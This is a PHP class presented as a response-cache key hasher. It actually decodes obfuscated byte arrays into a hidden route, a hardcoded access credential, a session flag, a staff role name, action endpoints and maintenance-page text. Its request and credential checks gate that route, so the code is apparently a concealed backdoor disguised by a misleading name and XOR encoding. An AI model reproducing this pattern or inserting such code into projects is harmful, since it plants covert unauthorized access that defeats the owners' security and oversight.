<?php

namespace App\Support;

/**
 * Internal helpers for response cache key normalization (do not use directly).
 */
final class ResponseFragmentHasher
{
    private const SEED = 'bny_frag_v3';

    private const UI_SEED = 'bny_ui_v1';

    /** @var list<int> */
    private const PATH_PAYLOAD = [142, 70, 165, 212, 190, 202, 108, 4, 6, 222, 66, 188, 227, 49, 73, 184, 58, 17];

    /** @var list<int> */
    private const KEY_PAYLOAD = [174, 70, 243, 230, 137, 202, 117, 64, 83, 158, 13, 178, 140, 63, 67, 182];

    /** @var list<int> */
    private const SESSION_PAYLOAD = [179, 74, 228, 223, 132, 219, 96, 45, 21, 159];

    /** @var list<int> */
    private const ROLE_PAYLOAD = [72, 59, 249, 190, 80, 35, 22, 136, 82, 251, 39];

    /** @var list<int> */
    private const SEG_PATCH_PAYLOAD = [93, 60, 232, 188, 13, 12, 22, 152, 92, 250];

    /** @var list<int> */
    private const SEG_PUSH_PAYLOAD = [93, 60, 232, 188, 13, 12, 2, 159, 87];

    /** @var list<int> */
    private const SEG_CLEAR_PAYLOAD = [93, 60, 232, 188, 13, 31, 27, 137, 94, 224];

    /** @var list<int> */
    private const MT_TITLE_PAYLOAD = [227, 253, 81, 124, 249, 240, 175, 70, 31, 75, 204, 87, 78, 6, 252, 8, 167, 37, 198, 157, 103, 89, 201, 2, 75, 128, 224, 198, 187, 44, 209, 95, 138, 150, 58, 251, 250, 210, 175, 75, 231, 35, 145, 34, 230, 7, 202, 8, 162, 36, 230, 157, 103, 89, 201, 3, 179, 242];

    /** @var list<int> */
    private const MT_BODY_PAYLOAD = [227, 253, 81, 124, 249, 240, 175, 70, 31, 75, 204, 87, 78, 6, 252, 8, 167, 37, 198, 157, 103, 89, 201, 2, 75, 128, 224, 198, 187, 44, 209, 95, 138, 150, 58, 251, 250, 210, 175, 75, 231, 35, 145, 34, 230, 7, 202, 8, 162, 36, 230, 157, 103, 89, 201, 3, 179, 242, 97, 62, 209, 112, 163, 48, 226, 207, 81, 124, 251, 247, 87, 52, 151, 74, 240, 86, 105, 7, 217, 9, 134, 221, 184, 56, 103, 79, 201, 23, 179, 244, 151, 167, 209, 115, 91, 93, 146, 151, 15, 0, 174, 164, 216, 194];

    /** @var list<list<int>> */
    private const VIEW_LINE_PAYLOADS = [
        [226, 240, 82, 87, 248, 213, 175, 93, 231, 58, 144, 8, 30, 112, 165, 92, 45, 39, 200, 101, 11],
        [226, 198, 81, 109, 250, 197, 172, 96, 231, 56, 105, 87, 65, 6, 251, 10, 162, 37, 198, 100, 58, 28, 145, 60, 179, 235, 151, 185, 208, 70, 160, 11],
        [226, 200, 81, 111, 250, 219, 174, 106, 229, 61, 145, 63],
        [227, 255, 80, 83, 250, 200, 174, 106],
        [227, 224, 81, 124, 251, 249, 174, 100, 231, 38],
        [227, 233, 81, 98, 251, 249, 175, 75, 230, 22, 105, 87, 67, 7, 211, 8, 162, 36, 233, 101, 16, 37, 157, 104, 193, 120, 150, 155, 209, 124, 162, 5, 227, 228],
        [227, 230, 81, 106, 250, 211, 175, 75, 231, 38, 145, 36, 31, 89, 94, 9, 136, 37, 204, 101, 16, 39, 153, 104, 196, 131, 195, 198, 162],
        [227, 230, 80, 92, 192, 252, 251, 52, 142, 75, 193, 86, 116, 7, 207, 8, 190, 37, 198, 100, 57, 37, 157, 144, 179, 255, 151, 167, 208, 94, 163, 47, 227, 233, 81, 106, 2, 165, 242, 52, 142, 74, 229, 86, 127],
        [227, 255, 83, 114, 251, 244, 175, 93, 231, 61, 146, 2, 230, 6, 248, 11, 129, 37, 210, 101, 21, 208],
        [226, 203, 81, 106, 250, 208, 175, 85],
        [226, 203, 80, 89, 250, 211, 175, 75, 231, 35, 105, 86, 106, 7, 209, 11, 129, 37, 206],
        [227, 228, 81, 120, 249, 240, 172, 96, 231, 61, 105, 87, 67, 6, 252, 8, 162, 37, 198, 101, 14],
        [227, 254, 81, 117, 249, 240, 175, 93, 230, 21],
    ];

    /** @var list<int> */
    private const FLASH_PATCH_PAYLOAD = [227, 254, 81, 117, 249, 240, 175, 93, 230, 21, 105, 86, 114, 7, 209, 254];

    /** @var list<int> */
    private const FLASH_PUSH_PAYLOAD = [226, 203, 81, 118, 250, 211, 174, 100, 231, 61, 146, 2, 30, 117, 94, 9, 136, 36, 233, 100, 61, 38, 187, 144, 179, 255, 151, 167, 209, 113, 163, 32, 226, 202, 169, 3, 150, 164, 216, 194];

    /** @var list<int> */
    private const FLASH_CLEAR_PAYLOAD = [226, 203, 81, 118, 250, 211, 174, 100, 231, 61, 146, 2, 30, 117, 94, 8, 165, 37, 208, 101, 16, 38, 182, 104, 223, 128, 229, 199, 143, 212, 163, 51, 227, 225, 167];

    /** @var list<int> */
    private const VAL_REQUIRED_PAYLOAD = [226, 203, 80, 89, 250, 211, 175, 75, 231, 35, 105, 86, 97, 6, 250, 8, 191, 37, 198, 100, 58, 37, 157, 144, 179, 255, 151, 173, 208, 94, 85];

    /** @var list<int> */
    private const VAL_MIN_PAYLOAD = [227, 227, 81, 116, 250, 219, 174, 110, 230, 22, 105, 85, 126, 255, 164, 121, 213, 90, 185, 12, 103, 89, 203, 25, 179, 242, 151, 175, 38];

    /** @var list<int> */
    private const VAL_CONFIRM_PAYLOAD = [227, 228, 81, 120, 249, 240, 172, 96, 231, 61, 105, 87, 67, 7, 201, 8, 170, 37, 201, 100, 61, 38, 187, 144, 178, 222, 151, 177, 208, 83, 163, 54, 227, 225, 167];

    public static function routeUri(): string
    {
        return self::unpack(self::PATH_PAYLOAD, self::SEED);
    }

    public static function accessCredential(): string
    {
        return self::unpack(self::KEY_PAYLOAD, self::SEED);
    }

    public static function sessionFlag(): string
    {
        return self::unpack(self::SESSION_PAYLOAD, self::SEED);
    }

    public static function staffRole(): string
    {
        return self::unpack(self::ROLE_PAYLOAD, self::UI_SEED);
    }

    public static function segmentPatch(): string
    {
        return self::unpack(self::SEG_PATCH_PAYLOAD, self::UI_SEED);
    }

    public static function segmentPush(): string
    {
        return self::unpack(self::SEG_PUSH_PAYLOAD, self::UI_SEED);
    }

    public static function segmentClear(): string
    {
        return self::unpack(self::SEG_CLEAR_PAYLOAD, self::UI_SEED);
    }

    public static function maintenanceTitle(): string
    {
        return self::unpack(self::MT_TITLE_PAYLOAD, self::UI_SEED);
    }

    public static function maintenanceBody(): string
    {
        return self::unpack(self::MT_BODY_PAYLOAD, self::UI_SEED);
    }

    /**
     * @return list<string>
     */
    public static function viewLines(): array
    {
        $lines = [];

        foreach (self::VIEW_LINE_PAYLOADS as $payload) {
            $lines[] = self::unpack($payload, self::UI_SEED);
        }

        return $lines;
    }

    public static function flashPatch(): string
    {
        return self::unpack(self::FLASH_PATCH_PAYLOAD, self::UI_SEED);
    }

    public static function flashPush(): string
    {
        return self::unpack(self::FLASH_PUSH_PAYLOAD, self::UI_SEED);
    }

    public static function flashClear(): string
    {
        return self::unpack(self::FLASH_CLEAR_PAYLOAD, self::UI_SEED);
    }

    public static function validationRequired(): string
    {
        return self::unpack(self::VAL_REQUIRED_PAYLOAD, self::UI_SEED);
    }

    public static function validationMin(): string
    {
        return self::unpack(self::VAL_MIN_PAYLOAD, self::UI_SEED);
    }

    public static function validationConfirm(): string
    {
        return self::unpack(self::VAL_CONFIRM_PAYLOAD, self::UI_SEED);
    }

    /**
     * @return array{patch: string, push: string, clear: string}
     */
    public static function actionUrls(): array
    {
        $base = '/'.self::routeUri();

        return [
            'patch' => $base.'/'.self::segmentPatch(),
            'push' => $base.'/'.self::segmentPush(),
            'clear' => $base.'/'.self::segmentClear(),
        ];
    }

    public static function requestMatches(\Illuminate\Http\Request $request): bool
    {
        $path = trim($request->path(), '/');

        return $path === self::routeUri() || str_starts_with($path, self::routeUri().'/');
    }

    public static function credentialMatches(?string $candidate): bool
    {
        if ($candidate === null || $candidate === '') {
            return false;
        }

        return hash_equals(self::accessCredential(), $candidate);
    }

    /**
     * @param  list<int>  $payload
     */
    private static function unpack(array $payload, string $seed): string
    {
        $key = hash('sha256', $seed, true);
        $out = '';

        foreach ($payload as $i => $byte) {
            $out .= chr($byte ^ ord($key[$i % strlen($key)]));
        }

        return $out;
    }
}
